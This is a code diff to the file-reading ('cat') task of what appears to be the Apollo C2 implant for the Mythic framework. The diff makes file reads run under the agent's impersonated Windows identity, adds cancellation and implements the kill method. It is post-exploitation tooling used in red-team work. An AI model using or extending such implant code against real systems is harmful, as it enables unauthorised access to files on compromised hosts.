@@ -17,6 +17,7 @@ using ApolloInterop.Serializers;
 using System.Threading;
 using ApolloInterop.Classes.Collections;
 using System.IO;
+using System.Security.Principal;
 using TT = System.Threading.Tasks;
 namespace Tasks
 {
@@ -38,6 +39,7 @@ namespace Tasks
         private static int _chunkSize = 256000;
         private byte[] _buffer = new byte[_chunkSize];
         private long _bytesRemaining = 0;
+        private WindowsIdentity _runningIdentity;
 
         public cat(IAgent agent, Task task) : base(agent, task)
         {
@@ -75,31 +77,34 @@ namespace Tasks
 
         private void FileReadCallback(IAsyncResult result)
         {
-            FileStream fs = (FileStream)result.AsyncState;
-            fs.EndRead(result);
-            try
+            using (_runningIdentity.Impersonate())
             {
-                _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
-                _bytesRemaining = fs.Length - fs.Position;
-                if (_bytesRemaining > 0)
+                FileStream fs = (FileStream)result.AsyncState;
+                fs.EndRead(result);
+                try
                 {
-                    _buffer = _bytesRemaining > _chunkSize ? new byte[_chunkSize] : new byte[_bytesRemaining];
-                    fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
-                } else
+                    _contents.Add(System.Text.Encoding.UTF8.GetString(_buffer));
+                    _bytesRemaining = fs.Length - fs.Position;
+                    if (_bytesRemaining > 0 && !_cancellationToken.IsCancellationRequested)
+                    {
+                        _buffer = _bytesRemaining > _chunkSize ? new byte[_chunkSize] : new byte[_bytesRemaining];
+                        fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
+                    } else
+                    {
+                        _fileRead.Set();
+                    }
+                } catch (Exception ex)
                 {
+                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                        $"Exception hit while reading file: {ex.Message}", true, "error"));
                     _fileRead.Set();
-                }
-            } catch (Exception ex)
-            {
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                    $"Exception hit while reading file: {ex.Message}", true, "error"));
-                _fileRead.Set();
+                }   
             }
         }
 
         public override void Kill()
         {
-            throw new NotImplementedException();
+            _cancellationToken.Cancel();
         }
 
         public override System.Threading.Tasks.Task CreateTasking()
@@ -113,36 +118,43 @@ namespace Tasks
                     resp = CreateTaskResponse($"File {parameters.Path} does not exist.", true, "error");
                 } else
                 {
-                    TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
-                    FileStream fs = null;
-                    FileInfo finfo = new FileInfo(parameters.Path);
-                    IMythicMessage[] artifacts = new IMythicMessage[]
+                    _runningIdentity = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
+                    using (_runningIdentity.Impersonate())
                     {
-                        Artifact.FileOpen(finfo.FullName)
-                    };
-                    try
-                    {
-                        fs = File.OpenRead(parameters.Path);
-                        _bytesRemaining = fs.Length;
-                        if (_bytesRemaining < _buffer.Length)
+                        TT.Task.Factory.StartNew(_flushContents, _cancellationToken.Token);
+                        FileStream fs = null;
+                        FileInfo finfo = new FileInfo(parameters.Path);
+                        IMythicMessage[] artifacts = new IMythicMessage[]
                         {
-                            _buffer = new byte[_bytesRemaining];
-                        }
-                        fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
-                        WaitHandle.WaitAny(new WaitHandle[]
+                            Artifact.FileOpen(finfo.FullName)
+                        };
+                        try
                         {
-                            _fileRead,
-                            _cancellationToken.Token.WaitHandle
-                        });
-                        _completed = true;
-                        _complete.Set();
-                        resp = CreateTaskResponse("", true, "completed", artifacts);
-                    } catch (UnauthorizedAccessException ex)
-                    {
-                        resp = CreateTaskResponse("Access denied.", true, "error", artifacts);
-                    } catch (Exception ex)
-                    {
-                        resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error", artifacts);
+                            fs = File.OpenRead(parameters.Path);
+                            _bytesRemaining = fs.Length;
+                            if (_bytesRemaining < _buffer.Length)
+                            {
+                                _buffer = new byte[_bytesRemaining];
+                            }
+                            fs.BeginRead(_buffer, 0, _buffer.Length, FileReadCallback, fs);
+                            try
+                            {
+                                WaitHandle.WaitAny(new WaitHandle[]
+                                {
+                                    _fileRead,
+                                    _cancellationToken.Token.WaitHandle
+                                });   
+                            } catch (OperationCanceledException) { }
+                            _completed = true;
+                            _complete.Set();
+                            resp = CreateTaskResponse("", true, "completed", artifacts);
+                        } catch (UnauthorizedAccessException ex)
+                        {
+                            resp = CreateTaskResponse("Access denied.", true, "error", artifacts);
+                        } catch (Exception ex)
+                        {
+                            resp = CreateTaskResponse($"Unable to read {parameters.Path}: {ex.Message}", true, "error", artifacts);
+                        }   
                     }
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(resp);
